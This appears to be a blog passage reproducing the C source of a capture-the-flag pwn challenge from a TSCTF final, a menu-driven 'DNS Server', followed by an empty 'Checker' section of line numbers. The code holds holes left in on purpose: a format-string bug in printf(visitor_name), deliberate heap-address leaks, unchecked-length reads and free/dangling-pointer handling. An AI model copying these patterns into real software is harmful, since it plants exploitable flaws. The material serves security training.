class="built_in">fprintf</span>(fpresults,<span class="string">"\nYou Have Won %d Times\n"</span>, won);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nYou Have Lost %d Times\n"</span>, loss);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nKeep Playing and Set an All-Time Record!"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">     fclose(fpresults);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] Time out ... \n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *logo =</span><br><span class="line"><span class="string">"*******************************************\n"</span></span><br><span class="line"><span class="string">"*  _____   _____   _____   _____   _____  *\n"</span>    </span><br><span class="line"><span class="string">"* |_   _| /  ___/ /  ___| |_   _| |  ___| *\n"</span>    </span><br><span class="line"><span class="string">"*   | |   | |___  | |       | |   | |__   *\n"</span></span><br><span class="line"><span class="string">"*   | |   \\___  \\ | |       | |   |  __|  *\n"</span>   </span><br><span class="line"><span class="string">"*   | |    ___| | | |___    | |   | |     *\n"</span></span><br><span class="line"><span class="string">"*   |_|   /_____/ \\_____|   |_|   |_|     *\n"</span> </span><br><span class="line"><span class="string">"*                                         *\n"</span></span><br><span class="line"><span class="string">"* ------ Welcome to TSCTF FINAL --------- *\n"</span></span><br><span class="line"><span class="string">"* ------     Have a nice day    --------- *\n"</span></span><br><span class="line"><span class="string">"*  _____   _   __   _       ___   _       *\n"</span>      </span><br><span class="line"><span class="string">"* |  ___| | | |  \\ | |     /   | | |      *\n"</span>     </span><br><span class="line"><span class="string">"* | |__   | | |   \\| |    / /| | | |      *\n"</span>     </span><br><span class="line"><span class="string">"* |  __|  | | | |\\   |   / / | | | |      *\n"</span>     </span><br><span class="line"><span class="string">"* | |     | | | | \\  |  / /  | | | |___   *\n"</span>  </span><br><span class="line"><span class="string">"* |_|     |_| |_|  \\_| /_/   |_| |_____|  *\n"</span></span><br><span class="line"><span class="string">"*******************************************\n"</span></span><br><span class="line"><span class="string">"\n"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(logo);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    signal(<span class="number">14</span>,handler);</span><br><span class="line">alarm(<span class="number">200</span>);</span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)/<span class="number">60</span>);</span><br><span class="line">    visitor_name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(visitor_name,<span class="string">"anonym"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==GOD.ZE DNS Server=="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Login"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Add a DNS item"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. Parsing domain names "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4. Delete  DNS item"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"=====MENU======"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. set name"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. set motto"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. show motto"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4. Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==============="</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maybe_real_set_name</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%7s"</span>,visitor_name);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"OK, I know your name :"</span>);</span><br><span class="line"><span class="built_in">printf</span>(visitor_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">maybe_real_set_name();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_motto</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">0x200</span>] ;</span><br><span class="line">read_n(buffer,<span class="number">0x200</span>);</span><br><span class="line">motto = strdup(buffer);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (login_flag != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> * fmt = <span class="string">"%d"</span>;</span><br><span class="line"><span class="keyword">int</span> opt;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">scanf</span>(fmt,&amp;opt)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(opt)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span>((login_flag &amp; <span class="number">0x01</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">login_flag = login_flag|<span class="number">0x01</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"name:"</span>);</span><br><span class="line">set_name();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span>((login_flag &amp;<span class="number">0x10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">login_flag = login_flag|<span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"motto:"</span>);</span><br><span class="line">set_motto();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">if</span>((login_flag &amp;<span class="number">0x100</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">login_flag = login_flag|<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span>(motto!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(motto);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"invalid options\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_n</span><span class="params">(<span class="keyword">char</span> *src,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; i++ )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + src), <span class="number">1</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(src+i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(src+i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> nptr[<span class="number">16</span>];</span><br><span class="line">read_n(nptr, <span class="number">0xA</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_format</span><span class="params">(<span class="keyword">char</span> *ip)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ip[i]==<span class="string">'.'</span>)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_DNS</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> * <span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len,i;</span><br><span class="line"><span class="keyword">char</span> *remark;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; DNS_Node_List[i]; ++i )</span><br><span class="line">;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct DNS_Node));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ψ(｀∇´)ψ: Let me leave some clue [%03x]\n"</span>,((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp&amp;<span class="number">0xfff</span>));</span><br><span class="line"><span class="built_in">strcpy</span>(tmp-&gt;user,visitor_name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input domain: "</span>);</span><br><span class="line">read_n(tmp-&gt;domain,<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input length:"</span>);</span><br><span class="line">len =read_int();</span><br><span class="line">remark = <span class="built_in">malloc</span>(len+<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ψ(｀∇´)ψ: Let me leave some clue [%03x]\n"</span>,((<span class="keyword">unsigned</span>)remark&amp;<span class="number">0xfff</span>));</span><br><span class="line">tmp-&gt;ptr = remark;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input remark:"</span>);</span><br><span class="line">read_n(remark+<span class="number">0x20</span>,len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input IP:"</span>);</span><br><span class="line">read_n(remark,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">if</span>(check_format(remark)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error input,bye!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">DNS_Node_List[i]=tmp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Complete\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_domain</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">tmp</span>=0;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me ur domain:"</span>);</span><br><span class="line">read_n(domain,<span class="number">0x30</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( DNS_Node_List[i] &amp;&amp; !<span class="built_in">strcmp</span>(domain, DNS_Node_List[i]-&gt;domain) )</span><br><span class="line">&#123;</span><br><span class="line">tmp = DNS_Node_List[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"adder : %s\n"</span>,tmp-&gt;user );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"IP    : %s\n"</span>,tmp-&gt;ptr );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"remark: %s\n"</span>,(tmp-&gt;ptr + <span class="number">0x20</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------------------------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !tmp )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_DNS</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">int</span> i,zero,j;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me bad domain:"</span>);</span><br><span class="line">read_n(domain,<span class="number">0x30</span>);</span><br><span class="line">zero = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( DNS_Node_List[i] &amp;&amp; !<span class="built_in">strcmp</span>(domain, DNS_Node_List[i]-&gt;domain) &amp;&amp; !<span class="built_in">strcmp</span>(visitor_name,DNS_Node_List[i]-&gt;user) )</span><br><span class="line">&#123;</span><br><span class="line">zero = <span class="number">1</span>;</span><br><span class="line">tmp = DNS_Node_List[i];</span><br><span class="line">j=i;</span><br><span class="line"><span class="built_in">free</span>(tmp-&gt;ptr);</span><br><span class="line"><span class="built_in">free</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(zero)&#123;</span><br><span class="line">  DNS_Node_List[j]=<span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"complete\n"</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"shr $0x16,%rsp\n"</span></span><br><span class="line">        <span class="string">"shl $0x16,%rsp\n"</span></span><br><span class="line">        <span class="string">"xor $0x188,%rsp\n"</span></span><br><span class="line">        <span class="string">"push %rbp\n"</span></span><br><span class="line">        <span class="string">"mov %rsp,%rbp\n"</span></span><br><span class="line">        <span class="string">"sub $0x20,%rsp\n"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">int</span> option;</span><br><span class="line">init();</span><br><span class="line"><span class="comment">//menu();</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;option)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(option)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">menu1();</span><br><span class="line">login();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">add_DNS();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">parse_domain();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">delete_DNS();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"=͟͟͞͞ =͟͟͞͞ ﾍ( ´Д`)ﾉ :"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"              [Don't leave me alone, I can give u sh311 !]"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"              "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0xbabe</span>:</span><br><span class="line">game();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//login();</span></span><br><span class="line"><span class="comment">//game();</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">NODE -&gt; USER(8) + DOMAIN(0X30) +PTR(8)</span></span><br><span class="line"><span class="comment">CONTENT -&gt; DNS(0X20) + CONTENT(~)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure><h2 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span 